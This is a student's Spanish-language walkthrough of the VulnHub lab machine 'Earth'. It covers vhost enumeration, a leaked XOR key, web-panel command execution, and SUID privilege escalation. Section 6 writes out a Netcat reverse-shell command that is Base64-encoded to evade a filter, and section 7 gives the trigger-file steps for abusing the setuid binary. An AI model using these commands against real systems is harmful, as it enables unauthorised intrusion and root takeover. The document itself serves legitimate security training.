# Earth — VulnHub

**Autor:** Carlos de la Cruz · ASIX 2
**Dificultad:** Media · **Plataforma:** VulnHub

> Resumen de la intrusión: vhosts en `/etc/hosts` → notas y `robots.txt` filtran usuario y mecanismo → descifrado XOR con CyberChef → RCE en panel admin → reverse shell evadiendo filtro con Base64 → escalada vía binario SUID `reset_root` analizado con `ltrace`.

---

## 1. Descubrimiento y reconocimiento

Usamos **netdiscover** para localizar la máquina en la red local.

```bash
netdiscover -i eth0 -r 10.0.2.0/24
```

![Netdiscover](images/01-netdiscover.png)

El objetivo es **10.0.2.16**. Lanzamos un Nmap exhaustivo.

```bash
nmap -sSVC -p- -Pn -n --min-rate 5000 -vvv 10.0.2.16
```

![Resultado de netdiscover](images/02-netdiscover-result.png)

Nmap muestra **tres puertos abiertos**: **22 (SSH)**, **80 (HTTP)** y **443 (HTTPS)**. El servidor web devuelve un error **"Bad Request (400)"**.

![Escaneo Nmap y Bad Request](images/03-nmap-badrequest.png)

---

## 2. Configuración de virtual hosts

Al entrar con la IP directa confirmamos el error **400**, lo que indica que el servidor solo responde a determinados nombres de dominio. Añadimos dos vhosts locales a `/etc/hosts`:

```bash
echo "10.0.2.16 earth.local" >> /etc/hosts
echo "10.0.2.16 terratest.earth.local" >> /etc/hosts
```

![Edición de /etc/hosts](images/04-hosts.png)

Ahora `earth.local` carga correctamente: el portal **"Earth Secure Messaging Service"**, con una imagen de la Tierra y un formulario de mensajes.

![Portal Earth Secure Messaging](images/05-earth-local.png)

El subdominio `terratest.earth.local` muestra una página idéntica.

![terratest.earth.local](images/06-terratest.png)

---

## 3. Enumeración y fuga de información

Explorando rutas ocultas damos con un **panel de login** en `terratest.earth.local/admin/login`. Inspeccionamos su código fuente buscando credenciales olvidadas, pero no hay nada útil ahí.

![Panel de login admin](images/07-login.png)

Sin embargo, en `/testingnotes.txt` encontramos información clave: el sistema usa **cifrado XOR**, existe un archivo `testdata.txt` y el **usuario administrador es `terra`**.

![testingnotes.txt](images/08-testingnotes.png)

El `/robots.txt` confirma la pista al incluir una regla `Disallow: /*testingnotes.*` para ocultar precisamente ese archivo a los buscadores.

![robots.txt](images/09-robots.png)

Accedemos a `/testdata.txt`, que contiene un texto sobre la formación radiométrica de la Tierra. Deducimos que será la **clave XOR** para descifrar la contraseña.

![testdata.txt](images/10-testdata.png)

---

## 4. Descifrado XOR con CyberChef

Tomamos el texto cifrado en hexadecimal que proporciona la máquina y, en **CyberChef**, aplicamos la operación **XOR** usando como clave el texto de `testdata.txt`. El resultado revela la contraseña: **`earthclimatechangebad4humans`**.

![Descifrado XOR en CyberChef](images/11-cyberchef.png)

Volvemos al panel `/admin/login` con las credenciales **`terra:earthclimatechangebad4humans`**.

---

## 5. RCE en el panel de administración

Iniciamos sesión y accedemos a la **"Admin Command Tool"**, una consola web para ejecutar comandos en el sistema.

![Admin Command Tool](images/12-admin-tool.png)

La probamos con comandos básicos (`cd /home; ls -al; pwd`). El servidor responde con el contenido del directorio, confirmando que tenemos **ejecución remota de comandos (RCE)**.

![Comprobación de RCE](images/13-rce.png)

---

## 6. Evasión del filtro y reverse shell

Intentamos una reverse shell con Netcat, pero un filtro la bloquea con el mensaje **"Remote connections are forbidden"**.

![Conexión bloqueada](images/14-bloqueo.png)

Antes de seguir, localizamos la primera flag. Navegamos a `/var`, detectamos el directorio `earth_web` y dentro encontramos `user_flag.txt`. Lo leemos con `cat` y obtenemos la **flag de usuario**.

![user_flag.txt y listener](images/15-userflag.png)

Para saltarnos el filtro, codificamos el comando de reverse shell en **Base64** y le pedimos al servidor que lo decodifique y ejecute:

```bash
echo 'nc -e /bin/bash 10.0.2.9 4444' | base64
# en la consola web: echo <base64> | base64 -d | bash
```

La evasión funciona y recibimos la conexión en nuestro listener (`nc -nlvp 4444`). Ya estamos dentro.

![Reverse shell con Base64](images/16-base64-shell.png)

---

## 7. Escalada de privilegios (SUID reset_root)

Como usuario `apache` (bajos privilegios), buscamos binarios con SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Destaca uno muy sospechoso: **`/usr/bin/reset_root`**. Al ejecutarlo, el programa intenta restablecer la contraseña de root pero falla con **"RESET FAILED, ALL TRIGGERS ARE NOT PRESENT"**: le faltan unos "detonadores".

![Búsqueda SUID y reset_root](images/17-suid-resetroot.png)

Transferimos el binario a nuestra máquina y lo analizamos con **ltrace** para ver su comportamiento interno. Descubrimos que comprueba la existencia de tres archivos: `/dev/shm/kHgTFI5G`, `/dev/shm/Zw7bV9U5` y `/tmp/kcM0Wewe`.

```bash
ltrace /home/c-delacruz/reset_root
```

![Análisis con ltrace](images/18-ltrace.png)

De vuelta en la víctima, creamos esos tres archivos vacíos con `touch` y volvemos a ejecutar el binario. Esta vez funciona y muestra **"RESETTING ROOT PASSWORD TO: Earth"**.

```bash
touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
/usr/bin/reset_root
```

![Creación de triggers y reset](images/19-triggers.png)

---

## 8. Flag final (root)

Cambiamos a root con `su root` y la contraseña `Earth`. Confirmamos con `whoami`, navegamos a `/root` y leemos `root_flag.txt` para capturar la **flag final**.

![Acceso root y listado](images/20-suroot.png)

![Flag de root](images/21-rootflag.png)

---

## Conclusión

Earth es una máquina rica en técnicas: virtual hosts, fuga de información en notas y `robots.txt`, criptografía **XOR** (rompible al reutilizar la clave en claro), **RCE** en un panel mal protegido, **evasión de filtros** mediante Base64 y, por último, ingeniería inversa con `ltrace` para destrabar un binario SUID. La lección central es que cada pieza de información expuesta (usuario, algoritmo, archivos de prueba) reduce drásticamente la seguridad del conjunto.
